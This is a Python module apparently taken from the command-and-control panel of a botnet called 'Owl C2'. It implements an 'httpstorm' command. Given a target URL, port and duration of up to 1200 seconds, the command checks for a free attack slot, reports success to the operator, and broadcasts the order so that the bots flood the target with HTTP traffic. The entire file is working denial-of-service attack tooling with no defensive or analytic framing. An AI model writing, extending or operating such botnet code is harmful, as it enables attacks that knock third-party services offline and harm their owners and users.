import src.Commands.slot_handler as slot_handler

def httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data,mxtime):
    from src.cnc import gradientText

    if len(args) == 4:
        url = args[1]
        port = args[2]
        secs = args[3]
        if validate_time(secs,mxtime):
            slotvar = slot_handler.is_attack_running()
            if slotvar[0]:
                send(client, gradientText(f'\nAttack already running {slotvar[1]:.2f} seconds remaining\n',(255,0,0), (255,100,100)))
                return
            send(client, gradientText(f"\nAttack successfully sent to all Owl C2 Servers!\n", (147, 103, 176), (189, 174, 199)))
            broadcast(data)
            slot_handler.set_attack(int(secs))
        else:
            send(client, gradientText('\nInvalid attack duration (1-1200 seconds)\n', (255,0,0), (255,100,100)))
    else:
        send(client, gradientText('\nUsage: .httpstorm [URL] [PORT] [TIME]\n', (147, 103, 176), (189, 174, 199)))